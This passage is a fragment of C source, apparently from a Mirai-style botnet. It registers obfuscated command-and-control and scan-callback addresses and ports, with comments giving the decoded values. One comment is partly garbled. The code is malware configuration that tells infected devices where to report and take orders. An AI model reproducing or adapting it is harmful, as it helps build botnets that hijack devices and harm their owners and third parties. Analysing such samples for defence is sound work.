...
{
    add_entry(TABLE_CNC_DOMAIN, "\xE2\x8A\x23\x2A", 4); // 192.168.1.8
    add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23 (1990 \x25\xE4)

    add_entry(TABLE_SCAN_CB_DOMAIN, "\xE2\x8A\x23\x24", 4); // 192.168.1.6
    add_entry(TABLE_SCAN_CB_PORT, "\x46\x9E", 2);         // 45788
